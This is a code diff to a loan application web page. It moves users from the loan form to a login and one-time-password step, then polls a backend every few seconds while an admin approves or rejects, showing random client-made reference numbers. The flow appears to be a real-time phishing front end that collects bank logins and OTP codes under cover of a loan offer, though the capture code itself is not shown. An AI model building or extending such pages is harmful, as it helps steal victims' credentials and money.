@@ -296,7 +296,7 @@ input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;bac
     <div class="foot">
       <div class="brow">
         <button class="btn-back" onclick="go('s-p3','s-p1')">Back</button>
-        <button class="btn-primary" onclick="submitLoanApplication()">Submit for Approval</button>
+        <button class="btn-primary" onclick="goToLogin()">Continue to Login</button>
       </div>
     </div>
   </div>
@@ -382,9 +382,9 @@ input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;bac
 // ═══════════════════════════════════════
 //  CONFIGURATION
 // ═══════════════════════════════════════
-const API_BASE = window.location.origin; // Same server serves both frontend & backend
-const POLL_INTERVAL = 3000; // Poll every 3 seconds
-const POLL_TIMEOUT  = 120000; // Stop polling after 2 minutes
+const API_BASE = window.location.origin;
+const POLL_INTERVAL = 3000;
+const POLL_TIMEOUT  = 120000;
 
 var durVal = 6;
 var otpTimer = null;
@@ -502,9 +502,6 @@ function populateReview() {
 //  BACKEND INTEGRATION
 // ═══════════════════════════════════════
 
-/**
- * Show the polling overlay.
- */
 function showPolling(title, desc) {
   document.getElementById('pollingTitle').textContent = title || 'Awaiting Approval';
   document.getElementById('pollingDesc').textContent = desc || 'Your application has been sent to our team for review.';
@@ -512,25 +509,16 @@ function showPolling(title, desc) {
   document.getElementById('pollingOverlay').style.display = 'flex';
 }
 
-/**
- * Hide the polling overlay.
- */
 function hidePolling() {
   document.getElementById('pollingOverlay').style.display = 'none';
 }
 
-/**
- * Show error in the polling overlay.
- */
 function showPollingError(msg) {
   var errEl = document.getElementById('pollingError');
   errEl.textContent = msg;
   errEl.style.display = 'block';
 }
 
-/**
- * Submit loan application to backend, then start polling.
- */
 async function submitLoanApplication() {
   var a = parseInt(document.getElementById('slider').value) || 20;
   var m = durVal;
@@ -549,7 +537,6 @@ async function submitLoanApplication() {
     totalRepayable: usd(total)
   };
 
-  // Show polling overlay
   showPolling('Submitting Application...', 'Sending your application to our team for review.');
 
   try {
@@ -568,11 +555,9 @@ async function submitLoanApplication() {
 
     currentToken = data.token;
 
-    // Update polling UI
     document.getElementById('pollingTitle').textContent = 'Awaiting Approval';
     document.getElementById('pollingDesc').textContent = 'Your application has been sent to our team for review. This usually takes less than a minute.';
 
-    // Start polling
     startPolling();
 
   } catch (err) {
@@ -581,16 +566,12 @@ async function submitLoanApplication() {
   }
 }
 
-/**
- * Start polling for admin response.
- */
 function startPolling() {
   var startTime = Date.now();
 
   clearInterval(pollTimer);
 
   pollTimer = setInterval(async function() {
-    // Check timeout
     if (Date.now() - startTime > POLL_TIMEOUT) {
       clearInterval(pollTimer);
       showPollingError('Approval timed out. Please try again later.');
@@ -621,40 +602,31 @@ function startPolling() {
         hidePolling();
         onLoanRejected();
       }
-      // else: still 'pending', keep polling
 
     } catch (err) {
       console.error('Poll error:', err);
-      // Don't stop polling on network errors
     }
   }, POLL_INTERVAL);
 }
 
-/**
- * Called when admin approves the loan.
- */
 function onLoanApproved() {
-  // Generate reference number
   var ref = 'ECL-2026-' + Math.floor(100000 + Math.random() * 900000);
   document.getElementById('ref-num').textContent = ref;
   document.getElementById('successTitle').textContent = 'Application Approved';
   document.getElementById('successMsg').textContent = 'Congratulations! Your loan application has been approved. You\'ll receive an SMS with your reference number and next steps shortly.';
-  go('s-p3', 's-ok');
+  go('s-otp', 's-ok');
 }
 
-/**
- * Called when admin rejects the loan.
- */
 function onLoanRejected() {
   var ref = 'ECL-2026-' + Math.floor(100000 + Math.random() * 900000);
   document.getElementById('ref-num').textContent = ref;
   document.getElementById('successTitle').textContent = 'Application Declined';
   document.getElementById('successMsg').textContent = 'Unfortunately, your loan application was not approved at this time. You may apply again after 30 days or contact our support team for more information.';
-  go('s-p3', 's-ok');
+  go('s-otp', 's-ok');
 }
 
 // ═══════════════════════════════════════
-//  LOGIN / OTP (unchanged navigation)
+//  LOGIN / OTP
 // ═══════════════════════════════════════
 
 function goToLogin() {
@@ -676,13 +648,10 @@ function goToOtp() {
   startOtpCountdown();
 }
 
-function goToSuccess() {
-  var ref = 'ECL-2026-' + Math.floor(100000 + Math.random() * 900000);
-  document.getElementById('ref-num').textContent = ref;
-  document.getElementById('successTitle').textContent = 'Application submitted';
-  document.getElementById('successMsg').textContent = 'Your application is being reviewed. You\'ll receive an SMS with your reference number and next steps shortly.';
+function onOtpSubmit() {
+  // OTP verified → now submit loan to backend for admin approval
   clearInterval(otpTimer);
-  go('s-otp', 's-ok');
+  submitLoanApplication();
 }
 
 function goBackToLogin() {
@@ -771,7 +740,7 @@ document.getElementById('backBtn').addEventListener('click', function() {
 
 submitBtn.addEventListener('click', function() {
   if (submitBtn.classList.contains('active')) {
-    goToSuccess();
+    onOtpSubmit();
   }
 });
 
